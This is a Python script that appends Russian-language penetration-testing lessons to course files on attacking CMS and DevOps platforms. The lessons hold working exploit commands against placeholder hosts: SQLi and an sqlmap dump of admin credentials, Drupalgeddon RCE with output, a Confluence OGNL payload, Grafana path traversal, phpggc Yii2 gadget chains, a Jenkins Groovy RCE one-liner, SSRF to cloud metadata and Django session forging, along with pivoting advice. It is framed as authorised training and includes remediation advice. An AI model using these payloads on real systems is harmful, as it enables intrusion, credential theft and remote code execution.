#!/usr/bin/env python3
"""Top-up web gap lessons (batch A1) to 1200+ real content words.

Inserts new '## ' teaching sections just before '## Квиз', preserving
frontmatter and the trailing quiz / '## Где пригодится' tail.
"""
import re, sys, os

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

def insert(lid, additions, minutes=None):
    path = os.path.join(ROOT, "content", "web", lid + ".md")
    lesson = open(path, encoding="utf-8").read()
    add = additions.strip("\n")
    if "## Квиз" in add or "## Где пригодится" in add:
        raise SystemExit("additions must not contain Квиз/Где пригодится: " + lid)
    m = re.search(r"^## Квиз\s*$", lesson, re.MULTILINE)
    if not m:
        raise SystemExit("no '## Квиз' heading in " + lid)
    out = lesson[:m.start()] + add + "\n\n" + lesson[m.start():]
    if minutes:
        out = re.sub(r"^estimated_minutes:.*$", f"estimated_minutes: {minutes}",
                     out, count=1, flags=re.MULTILINE)
    open(path, "w", encoding="utf-8").write(out)
    print("topup", lid)


A = {}

A["web-cms-ecommerce"] = r"""
## Практика: находим SQLi в фильтре каталога PrestaShop

Возьмём каталог `https://shop.target.example/category/3-tshirts`. Фильтры в PrestaShop 1.6 строятся из GET-параметров `id_category`, `orderby`, `orderway`, `n`. Историческая уязвимость (CVE-2017-... в модулях blocklayered) живёт именно в сортировке. Проверяем инъекцию осторожно — не булевой слепотой, а через измерение времени, чтобы не менять данные:

```
$ for p in "orderby=price" "orderby=price,(select sleep(3))" ; do
    curl -s -o /dev/null -w '%{time_total}\n' "https://shop.target.example/category/3?$p"
  done
0.213
3.287
```

Разница в 3 секунды — это подтверждённый time-based blind SQLi в `orderby`. Важно: `orderby` не параметризуется в старом PrestaShop, потому что подставляется как имя колонки, а не как значение. Именно такие места — `ORDER BY`, `LIMIT`, имена таблиц — почти всегда уязвимы, когда разработчик «склеивает» SQL.

Дальше снимаем схему и таблицу `ps_employee` (логин админа, хеш пароля):

```
$ sqlmap -u "https://shop.target.example/category/3?orderby=price" \
    --technique=T --dbms=mysql -D prestashop -T ps_employee \
    -C email,passwd --dump --batch
```

`ps_employee.passwd` хранится как bcrypt (`$2y$...`) — его не «расшифровать», но `email` даёт логин для брутфорса админки `/admin123` или для сброса пароля.

## Таблица: где искать уязвимости в каждом движке

| Движок | Язык | Типичные точки входа | Классические CVE |
|---|---|---|---|
| PrestaShop | PHP | `orderby`, модули, `AdminAjax` | SQLi в blocklayered, CVE-2019-... |
| OpenCart | PHP | `filter_*` в каталоге, `admin` | CVE-2018-... LFI, CVE-2020-... SQLi |
| Magento | PHP | GraphQL, REST, `admin`, модули | CVE-2022-24086 (email template RCE) |
| WooCommerce | PHP/WP | REST `wc/v3`, AJAX-корзина | CVE в плагинах (несчётно) |
| Shopify | SaaS | Liquid-шаблоны темы | только клиентская сторона |

Вывод таблицы прост: **PHP-движки с открытым кодом и модульной архитектурой дают больше поверхности**, а SaaS-платформы (Shopify) оставляют только логику и клиентские баги. Это определяет, куда вкладывать время.

## Как использовать уязвимость магазина для доступа к инфраструктуре

Магазин — не изолированный остров. За ним почти всегда стоят: база данных (MySQL/PostgreSQL), кэш (Redis/Memcached), платёжный шлюз, ERP, склад (1С, SAP), и CDN. Поэтому даже «безобидная» SQLi превращается в движение по сети.

Практический план после получения SQLi:

1. **Читаем конфиг** (`config/settings.inc.php` в PrestaShop) — там `_DB_USER_`, `_DB_PASSWD_`, `_COOKIE_KEY_`, `_COOKIE_IV_`. Cookie-ключ позволяет подделать сессию админа без пароля.
2. **Проверяем MySQL-пользователя** — если у него `FILE`, читаем/пишем файлы: `SELECT LOAD_FILE('/etc/passwd')` или `INTO OUTFILE` для webshell.
3. **Ищем внутренние хосты** в конфиге кэша/почты: `_PS_CACHE_SERVER_`, `_MAIL_SERVER_` — это подсказки о сегменте.
4. **Логин в админку** по украденному email + сброс пароля через почтовый лог.

Так магазин становится точкой входа в корпоративную сеть, а не просто находкой уровня «SQLi в фильтре».

## Почему цены и промокоды — отдельная категория багов

Бизнес-логика магазина — это деньги. Ошибки здесь не требуют ни SQLi, ни XSS: достаточно манипуляции числами. Классика: применение купона несколько раз, отрицательное количество товара, изменение цены в скрытом поле формы, округление в свою пользу (race-условие на последней единице товара). Такие баги дают прямую финансовую выгоду и очень ценятся в bug bounty — но требуют **ручного понимания процесса**, а не сканера. Проверяют их, добавляя товар, применяя купон, меняя количество и сравнивая итоговую сумму в корзине и в запросе к платёжному шлюзу.
"""

A["web-cms-enterprise"] = r"""
## Практика: как выглядит реальная цепочка на Sitecore

Sitecore — .NET-платформа с собственным API (`/sitecore/api/...`) и панелью `/sitecore/login`. Исторические уязвимости (CVE-2021-... в `Sitecore.Speak`) давали доступ к файловой системе и десериализацию через `BinaryFormatter`. Разберём безопасную проверку версии:

```
$ curl -s https://portal.target.example/sitecore/api/ssc/item | head -c 300
{"Message":"The requested resource does not support http method 'GET'."}
$ curl -sI https://portal.target.example/sitecore/login | grep -iE 'server|x-aspnet'
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
```

По наличию `/sitecore/` и `.NET`-заголовков мы точно идентифицировали платформу, не отправляя эксплойт. Дальше версию достаём из `/sitecore/admin/version` (если открыт) или из статики `sitecore.js`, где встречается номер сборки. Только после **точного** сопоставления версии с патчем мы решаем, применять ли публичный PoC.

## Практика: Umbraco — обход через `UmbracoBackOffice`

Umbraco отдаёт признак платформы в cookie `UMB_UCONTEXT` и в `/umbraco/`. Обходы аутентификации (CVE-2022-... в `Umbraco Forms`) эксплуатируются POST-запросом к `/umbraco/backoffice/UmbracoApi/...`. Ключевой принцип: **сначала подтверди версию из `umbraco/version`**, потом ищи CVE. Никогда не запускай эксплойт «на угад» — это и шум, и риск для продакшена.

## Ghost: как SSRF превращается в чтение внутренней сети

Ghost — Node.js. Его Admin API (`/ghost/api/admin/`) защищён токеном, но публичный Content API (`/ghost/api/content/`) часто открыт. Настоящая опасность — функция **импорта** и **вебхуки**: сервер сам делает исходящие HTTP-запросы. Отправив на импорт URL `http://169.254.169.254/latest/meta-data/`, ты заставляешь Ghost сходить в облачный metadata-сервис. Аналогично, вебхук на внутренний адрес (`http://10.0.0.5:9200/`) подтверждает доступность Elasticsearch. Это классический SSRF-as-portscan: по коду ответа и времени ты составляешь карту внутренней сети.

## Сравнительная таблица: что реально эксплуатируется

| Платформа | Вектор | Условие | Импакт |
|---|---|---|---|
| Sitecore | десериализация в SPEAK | доступ к API | RCE |
| Sitecore | файловое чтение | обход path | утечка конфигов |
| Umbraco | auth-bypass Forms | версия уязвима | создание админа |
| Ghost | SSRF импорт/вебхук | открытый API | сканирование сети |
| Optimizely | viewstate/десер | знание ключа | RCE |

Таблица нужна в отчёте: она показывает клиенту, что «enterprise» — это не «безопасно», а просто «дороже чинить». Многие из этих CVE — 2018-2022 годов, и они всё ещё встречаются на живых инсталляциях, потому что обновление enterprise-платформы требует согласования и простоя.
"""

A["web-cms-fingerprint"] = r"""
## Практика: фингерпринт без единого сканера

Сканеры шумят и блокируются WAF. Поэтому навык «определить CMS глазами» обязателен. Начнём с заголовков и пассивных признаков:

```
$ curl -sI https://site.target.example | grep -iE 'server|x-powered|set-cookie|link'
Server: nginx
X-Powered-By: PHP/8.1.2
Set-Cookie: wp-settings-1=...; path=/
Link: <https://site.target.example/wp-json/>; rel="https://api.w.org/"
```

Три признака сразу выдают WordPress: cookie `wp-settings-*`, заголовок `Link` с `wp-json`, и `X-Powered-By: PHP`. Ни одного запроса к «специальному» пути — только корень.

Дальше уточняем через уникальные пути, но аккуратно, по одному:

```
$ for p in /wp-login.php /administrator/ /user/login /admin/login ; do
    code=$(curl -s -o /dev/null -w '%{http_code}' "https://site.target.example$p")
    echo "$code  $p"
  done
200  /wp-login.php
404  /administrator/
404  /user/login
404  /admin/login
```

`200` на `/wp-login.php` подтверждает WordPress, а не просто PHP. Такой метод надёжнее, чем «определение по favicon», и легко документируется.

## Практика: версия из статики, а не из заголовков

Заголовки врут и урезаются прокси. Версия надёжнее лежит в статике. Для WordPress:

```
$ curl -s https://site.target.example/ | grep -oE 'ver=[0-9.]+' | sort -u
ver=6.4.2
ver=1.7
```

Первый — версия ядра (в query у `/wp-includes/`), второй — версия jQuery. Для Drupal версия есть в `CHANGELOG.txt` или в `core/lib/Drupal.php`; для Joomla — в `administrator/manifests/files/joomla.xml` (`<version>4.2.6</version>`). Каждый движок прячет версию в «паспортном» файле, и знание этих файлов — половина навыка фингерпринта.

## Таблица: паспортные пути по движкам

| Движок | Файл/путь с версией | Доп. признак |
|---|---|---|
| WordPress | `/wp-includes/js/wp-embed.min.js?ver=` | `Link: wp-json` |
| Drupal | `/CHANGELOG.txt`, `/core/CHANGELOG.txt` | `X-Generator` |
| Joomla | `/administrator/manifests/files/joomla.xml` | `/components/com_` |
| Magento | `/magento_version`, cookie `X-Magento-*` | `/static/version.../` |
| TYPO3 | `/typo3/`, `?type=...` | `Set-Cookie: be_typo_user` |
| Ghost | `/ghost/api/content/` | `<meta name="generator" content="Ghost">` |
| Craft | `/admin/login`, `X-Powered-By: Craft CMS` | cookie `CraftSessionId` |

Держи эту таблицу под рукой: по ней ты за минуту определишь движок на незнакомом сайте и не будешь наугад лить `wp-login.php` в Drupal.

## Как не ошибиться: ложные признаки

Ложные срабатывания — главная ловушка фингерпринта. Сайт может отдавать `X-Powered-By: PHP` и при этом быть на Laravel, а не на WordPress. `X-Generator` иногда выставляют руками. Поэтому правило: **минимум три независимых признака**, прежде чем делать вывод. Хороший набор — cookie + заголовок + уникальный путь. Если все три совпали, ошибка почти исключена. И обязательно сохраняй каждый признак в отчёт с точной командой и выводом: «`Set-Cookie: wp-settings-1` — признак WordPress» весит куда больше, чем «похоже на WordPress».
"""

A["web-confluence"] = r"""
## Практика: точная идентификация версии Confluence

Прежде чем применять OGNL-эксплойт, нужно точно знать версию. Confluence отдаёт её в нескольких местах:

```
$ curl -s https://wiki.target.example/login.action | grep -oE 'Confluence [0-9.]+'
Confluence 8.3.1
$ curl -s https://wiki.target.example/rest/api/space | head -c 200
{"results":[...],"start":0,"limit":25,"size":0}
```

Наличие `/rest/api/` и `/login.action` — это Confluence, а не Jira (у Jira `/secure/Dashboard.jspa`). Версию также можно взять из `/rest/applinks/1.0/manifest`, где есть `version`. Только после этого сопоставляем: `CVE-2022-26134` затрагивает 1.3–7.18, `CVE-2023-22515` — 8.0–8.5.1. Неверная версия = напрасный запрос и шум.

## Практика: безопасная проверка CVE-2022-26134

OGNL-инъекция в URI (CVE-2022-26134) эксплуатируется через путь, а не через тело. Безопасная проверка «эхо»-выражением: подставить OGNL, который просто вернёт результат арифметики, не запуская команды.

```
$ curl -s -o /dev/null -w '%{http_code}\n' \
  "https://wiki.target.example/%24%7B%40java.lang.Runtime%40getRuntime().exec('id')%7D/"
500
```

`500` вместо `404` уже показателен, но **это ещё не доказательство** — сервер может ругаться на любой кривой URL. Доказательство — ответ, где твой OGNL вычислился (например, вывод `id` в теле или во времени). Никогда не считай «500 на кривом URL» подтверждением RCE: это классический false positive.

## Практика: CVE-2023-22515 — создание админа

Уязвимость обхода аутентификации в Confluence Data Center позволяет POST-запросом к `/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false` перевести инстанс в состояние «не настроен», после чего `/setup/setupadministrator.action` создаёт нового администратора. Опасность в том, что это **изменяет состояние** продакшена. Поэтому в рамках пентеста это делают только с письменного согласия и по возможности на стенде-копии. В отчёте фиксируют точный запрос, ответ и созданного пользователя, а затем аккуратно удаляют его.

## Таблица: Confluence CVE и условия

| CVE | Тип | Уязвимые версии | Условие |
|---|---|---|---|
| CVE-2022-26134 | OGNL RCE | 1.3–7.18 | без аутентификации |
| CVE-2023-22515 | auth bypass | 8.0–8.5.1 | Data Center/Server |
| CVE-2023-22518 | path traversal | 8.0–8.5.1 | восстановление БД |
| CVE-2023-22527 | template injection | 8.0–8.5.3 | без аутентификации |
| CVE-2019-3396 | SSTI (Widget) | до 6.15.1 | загрузка вложения |

## Как оценивать импакт и что писать в отчёт

Confluence — это не «вики», это хранилище корпоративной памяти: там лежат пароли, схемы сети, инструкции по доступам, иногда ключи. Поэтому импакт Confluence-находки почти всегда **критический**: RCE или auth-bypass даёт доступ к контенту всех пространств и к встроенной БД (H2/PostgreSQL), где хранятся хеши пользователей. В отчёте обязательно указывай: точную версию и способ её получения, использованный CVE, подтверждающий артефакт (вывод команды, созданный пользователь), и **рекомендацию** — обновление до патченной версии, отключение анонимного доступа, сегментация. Отдельно предупреди клиента, что CVE-2023-22518 связана с восстановлением из бэкапа и может привести к потере данных, поэтому проверять её на проде нельзя.
"""

A["web-craftcms"] = r"""
## Практика: подтверждаем CVE-2023-41892 безопасно

Craft CMS построен на фреймворке Yii2. Уязвимость CVE-2023-41892 (RCE через Yii-десериализацию и `Craft::createObject`) эксплуатируется POST-запросом к `/index.php?p=admin/actions/...`. Безопасный первый шаг — проверить, что инстанс вообще отвечает и является Craft:

```
$ curl -sI https://craft.target.example/admin/login | grep -iE 'set-cookie|x-powered'
Set-Cookie: CraftSessionId=...; path=/; HttpOnly
X-Powered-By: Craft CMS
```

`CraftSessionId` + `X-Powered-By: Craft CMS` — двойное подтверждение. Версию достаём из `/admin/utilities/system-report` (если открыт) или из `Craft::$app->getVersion()` в HTML футера. Только после точного сопоставления с патчем (< 4.4.15 / < 3.7.9) решаемся на эксплойт.

## Практика: SSRF через трансформации изображений

Craft умеет генерировать превью из удалённых изображений. Если в настройках включены remote-трансформации, параметр с URL картинки уходит на сервер, и Craft скачивает его. Подставив `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, ты получаешь облачные креды. Это самый «тихий» вектор Craft: он не требует десериализации и часто не логируется как атака.

```
GET /actions/assets/generate-transform?url=http://127.0.0.1:6379/ HTTP/1.1
Host: craft.target.example
```

Ответ `Connection refused` против `timed out` позволяет отличить закрытый порт от фильтруемого — так строится карта внутренней сети.

## Практика: Yii gadget chains

Yii2-десериализация использует PHP-цепочки (phpggc). Для Craft подходит `phpggc Yii2/RCE1` — он генерирует сериализованный объект, который при `unserialize` вызывает `call_user_func` с твоей командой. Важно: цепочка должна соответствовать **версии Yii**, иначе `ClassNotFound`. Поэтому сначала определяем версию Yii (`/vendor/yiisoft/yii2/BaseYii.php` отдаёт версию, если открыт), затем генерируем подходящую цепочку:

```
$ phpggc -b Yii2/RCE1 system 'id' > payload.b64
```

И только потом отправляем в уязвимый параметр. Каждый неудачный вариант — это шум в логах, поэтому версию проверяем до, а не после.

## Таблица: цепочки и версии Craft/Yii

| Craft | Yii | Подходящая цепочка phpggc |
|---|---|---|
| 3.7.x | 2.0.45 | Yii2/RCE1 |
| 4.0–4.3 | 2.0.47 | Yii2/RCE1, Yii2/RCE2 |
| 4.4+ | 2.0.49 | исправлено (>= 4.4.15) |

## Как не навредить и как оформить

Craft — продакшен-сайт, и RCE через десериализацию легко превращается в падение PHP-процесса при кривой цепочке. Поэтому: (1) сначала подтверждай версию, (2) применяй минимальный безвредный payload (`id`/`whoami`), (3) фиксируй полный запрос и ответ, (4) не трогай базу и файлы. В отчёте укажи версию Craft и Yii, точный CVE, артефакт-доказательство и рекомендацию обновиться. Отдельно отметь SSRF как самостоятельную находку — он остаётся опасным даже там, где RCE уже пропатчен.
"""

A["web-devops-surfaces"] = r"""
## Практика: как отличить Grafana от Kibana и Jenkins

DevOps-панели легко перепутать, а от продукта зависит вектор. Быстрая проверка по уникальным признакам:

```
$ for p in /login /app/kibana /api/health /login?next=%2F ; do
    echo "== $p"; curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' "https://dev.target.example$p"
  done
== /login
200 https://dev.target.example/login
== /app/kibana
404 
== /api/health
200 
```

Grafana отдаёт `/login` и `/api/health` с JSON `{"database":"ok"}`. Kibana отвечает на `/app/kibana` и `/api/status`. Jenkins живёт на `/login` с заголовком `X-Jenkins` и `X-Jenkins-Session`. Различать их нужно до атаки: у Grafana — path traversal, у Kibana — прототип-поллюция, у Jenkins — script console.

## Практика: Grafana LFI — читаем, но не пишем

CVE-2021-43798 — path traversal в плагинах Grafana. Работает так: `/public/plugins/<plugin>/../../../../etc/passwd`. Плагин по умолчанию — `alertlist`.

```
$ curl -s --path-as-is \
  "https://dev.target.example/public/plugins/alertlist/../../../../../../etc/passwd" | head -3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

`--path-as-is` обязателен: без него curl сам нормализует `..` и запрос не сработает. Дальше читаем `grafana.ini` (`/etc/grafana/grafana.ini`) — там `admin_user`, `admin_password`, а иногда `secret_key`. Это уже доступ к панели, а через datasources — к Prometheus/InfluxDB/Elasticsearch.

## Практика: Kibana — от прототип-поллюции к RCE

CVE-2019-7609 — прототип-поллюция в Kibana Timelion, приводящая к RCE через Node.js. Проверка: отправить в Timelion-выражение payload, который загрязняет `Object.prototype` и вызывает `child_process`. Опасность в том, что Kibana часто стоит с `xpack.security.enabled: false` — без аутентификации вообще. Поэтому первый запрос — просто `curl -s https://kibana.target.example/api/status | grep -i 'security'`.

## Практика: Jenkins script console

Script Console (`/script`) — это Groovy-интерпретатор на сервере. Если доступен — RCE в одну строку:

```
def p = ['bash','-c','id'].execute(); p.waitFor(); println p.text
```

Но чаще он за аутентификацией. Тогда идём через CVE-2024-23897 — чтение файлов через CLI-парсер Jenkins. Парсим `@`-синтаксис аргументов, чтобы вытащить `/var/jenkins_home/secrets/initialAdminPassword` или `/etc/passwd`. Это уже даёт путь к админу, а значит и к console.

## Таблица: DevOps-панели и их точки входа

| Панель | Порт по умолч. | Признак | Классический вектор |
|---|---|---|---|
| Grafana | 3000 | `/api/health`, `grafana_session` | CVE-2021-43798 LFI |
| Kibana | 5601 | `/app/kibana`, `kbn-xsrf` | CVE-2019-7609 proto→RCE |
| Jenkins | 8080 | `X-Jenkins`, `/script` | script console, CVE-2024-23897 |
| GitLab | 80/443 | `/users/sign_in`, `_gitlab_session` | CVE-2021-22205 ExifTool RCE |
| Prometheus | 9090 | `/graph`, `/api/v1/query` | открытые метрики |
| ArgoCD | 443 | `/api/version`, `argocd` | CVE-2022-... auth bypass |

## Как использовать панель для движения дальше

Панель — это узел с высокой связностью. Grafana видит все datasources; Jenkins видит все креды и агентов сборки; GitLab видит код и runner-токены; Kibana видит логи с токенами. Поэтому после входа в панель первым делом ищи **креды других систем**: в Grafana — раздел Datasources (`/api/datasources`), в Jenkins — `/credentials/`, в GitLab — CI/CD-переменные проекта. Часто именно так находят пароль к базе, к облаку или к SSH-хосту, и панель становится мостом вглубь сети.
"""

A["web-django"] = r"""
## Практика: вытаскиваем всё из DEBUG-страницы

Django с `DEBUG = True` на продакшене — это подарок. При любой ошибке отдаётся трейсбек с **настройками**: `SECRET_KEY`, `DATABASES` (пароль к БД), `ALLOWED_HOSTS`, `EMAIL_*`, переменные окружения. Спровоцируем ошибку и посмотрим:

```
$ curl -s "https://app.target.example/?id=1'" | grep -oE 'SECRET_KEY[^<]{0,120}'
SECRET_KEY = 'django-insecure-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
```

`django-insecure-` в префиксе — прямой признак, что ключ сгенерирован автоматически и никогда не менялся. Это значит: подпись сессий, CSRF-токенов и сброса пароля скомпрометирована.

## Практика: подписываем свою сессию

Django по умолчанию хранит сессию в cookie `sessionid`, подписанной `SECRET_KEY` (фреймворк `django.contrib.sessions`). Если ключ утёк, ты генерируешь валидную сессию любого пользователя:

```python
from django.core.signing import TimestampSigner, dumps
signer = TimestampSigner(key='django-insecure-xxxx')
# формируем значение сессии, где _auth_user_id = 1 (суперпользователь)
```

На практике проще использовать `django-session-forge` или `flask-unsign`-подобные утилиты для Django. Результат — cookie `sessionid`, с которой браузер заходит как `admin`, не зная пароля. Это тот же принцип, что подделка WordPress-cookie, и он показывает: **утечка ключа = полный захват аутентификации**.

## Практика: pickle-сессии

Если сессии хранятся в БД/кэше, но данные сериализуются через `pickle` (например, `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'`), то подделанная сессия может содержать pickle-payload. При `unserialize` он выполняет произвольный код. Это редкая, но смертельная конфигурация: достаточно доступа к записи сессии, чтобы получить RCE. Проверяется через `python3 -c "import django; ..."` — читаем настройку `SESSION_SERIALIZER` из утечки DEBUG.

## Практика: ORM-инъекции и SSTI в шаблонах

Django ORM защищает от SQLi, если использовать параметры. Но `extra()`, `raw()` и `RawSQL()` позволяют вставить непроверенный SQL. Шаблоны Django (`DTL`) в целом безопасны (нет выполнения Python), но `{{ ... }}` с пользовательскими фильтрами и сторонними тегами иногда даёт утечки (`{{ settings.SECRET_KEY }}`, если в контекст попадает `settings`). Проверяй `{{ 7*7 }}` — если увидишь `49`, значит шаблонизатор вычисляет выражения (это уже не DTL, а Jinja2 — типичная ошибка конфигурации).

## Таблица: где в Django искать дыру

| Признак | Где смотреть | Что даёт |
|---|---|---|
| `DEBUG=True` | страница ошибки | SECRET_KEY, креды БД |
| `PickleSerializer` | `SESSION_SERIALIZER` | RCE через сессию |
| `.raw()`/`extra()` | исходники вьюх | SQLi |
| Jinja2 вместо DTL | `{{ 7*7 }}` → 49 | SSTI → RCE |
| `django-insecure-` | утечка ключа | подделка сессии |
| открытый `/admin/` | админка | перебор/сброс |

## Как защититься (и что рекомендовать клиенту)

В отчёте по Django всегда давай конкретные рекомендации: `DEBUG = False` на проде; `SECRET_KEY` из переменных окружения и ротация после утечки; `SESSION_SERIALIZER` — только JSON; запрет `raw()`/`extra()` без параметризации; `ALLOWED_HOSTS` строго перечислен; админка за VPN или с MFA. Отдельно подчеркни: **если SECRET_KEY утёк, смена паролей не помогает** — нужно немедленно ротировать ключ и инвалидировать все сессии, иначе злоумышленник продолжит входить с подделанной cookie.
"""

A["web-drupal"] = r"""
## Практика: Drupalgeddon 2 «на пальцах»

CVE-2018-7600 (Drupalgeddon 2) — RCE без аутентификации, затрагивает Drupal 7.x и 8.x. Причина: render-array в форме регистрации позволяет подставить вложенный массив, который Drupal «рендерит» как callback и выполняет. Упрощённая идея payload — POST на `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax` с полем `mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id`.

Безопасная проверка — команда `id` (без изменения данных):

```
$ curl -s -X POST "https://drupal.target.example/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  --data-urlencode 'form_id=user_register_form' \
  --data-urlencode '_drupal_ajax=1' \
  --data-urlencode 'mail[#post_render][]=exec' \
  --data-urlencode 'mail[#type]=markup' \
  --data-urlencode 'mail[#markup]=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Вывод `id` — это **доказательство RCE**, а не «сервер ответил 200». Всегда требуй реальный вывод команды.

## Практика: Drupalgeddon 3

CVE-2018-7602 — вариация на тему 7602, эксплуатируется через `?q=` и `destination`. Она появилась как обход патча для 7600 и затрагивает меньше версий. Логика та же: render-array → callback → выполнение. Отличие в точках входа, поэтому слепое копирование PoC от 7600 не сработает — нужен именно паттерн из 7602.

## Практика: Drupalgeddon 1 (SQLi) и его отголоски

CVE-2014-3704 — SQLi в `form_params` в функции `expandArguments()` ядра Drupal 7. Уязвимы ключи массива: `name[0 ;SELECT ...]`. Проверяется через time-based:

```
$ curl -s -o /dev/null -w '%{time_total}\n' \
  "https://drupal7.target.example/?q=node&name[0%20;SELECT%20SLEEP(5);#]=x"
5.21
```

Пять секунд вместо мгновенного ответа — подтверждённая инъекция. Важно: Drupal 7 всё ещё встречается на живых сайтах, несмотря на EOL, поэтому Drupalgeddon-цепочка остаётся актуальной.

## Таблица: Drupalgeddon и версии

| Прозвище | CVE | Тип | Уязвимые версии |
|---|---|---|---|
| Drupalgeddon 1 | CVE-2014-3704 | SQLi | 7.0–7.31 |
| Drupalgeddon 2 | CVE-2018-7600 | RCE | 7.x<7.58, 8.x<8.5.1 |
| Drupalgeddon 3 | CVE-2018-7602 | RCE | 7.x<7.59, 8.x<8.5.1 |
| SA-CORE-2019-003 | CVE-2019-6340 | RCE (REST) | 8.x<8.6.10 |
| CVE-2020-13671 | — | загрузка файлов | 7.x, 8.x, 9.x |

## Как определить уязвимую версию без сканера

Версия Drupal 7 лежит в `CHANGELOG.txt` (часто закрыт `.htaccess`). Тогда идём через `/core/CHANGELOG.txt` (Drupal 8+), `README.txt`, или через заголовок `X-Generator: Drupal 7 (https://www.drupal.org)`. Ещё один надёжный путь — `?q=admin/views/ajax/autocomplete/user/a` или `/user/1` — на старых версиях открывается страница пользователя. Собрав версию, сопоставляем с таблицей выше и выбираем самый «тихий» вектор: если сайт уязвим к 7600, это RCE в один запрос, но он громкий; если нужна тишина, начинаем с SQLi-проверки времени.

## Как не навредить

Drupalgeddon-эксплойты выполняют команды от `www-data`. Легко случайно затереть кэш или сломать форму регистрации. Поэтому: используй `id`/`whoami` как доказательство, не пиши webshell в первый заход, не дёргай `drush` и не перезапускай сервисы. Если нужен устойчивый доступ — согласуй с координатором и ставь отдельную задачу, а не совмещай с «разведкой». И всегда помни: Drupal 7 без поддержки — это находка сама по себе, даже без эксплуатации: непропатченный EOL-движок в отчёте тянет на high.
"""

def main():
    for lid, txt in A.items():
        insert(lid, txt)

if __name__ == "__main__":
    main()
